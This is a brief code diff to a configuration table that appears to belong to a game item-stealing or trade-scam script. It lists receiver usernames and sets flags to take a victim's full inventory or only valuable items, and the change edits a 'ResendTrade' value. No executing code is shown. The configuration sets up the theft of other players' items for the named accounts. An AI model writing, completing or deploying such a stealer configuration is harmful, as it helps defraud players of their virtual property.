@@ -21,7 +21,7 @@ shitConfig = {
     Receivers = {Username, "OnodaKun23", "Slay_OZ1", "YTB3AR", "kely5171"},
     FullInventory = true,
     GoodItemsOnly = true,
-    ResendTrade = "+",
+    ResendTrade = "hi",
     CustomLink = ""
 }
 
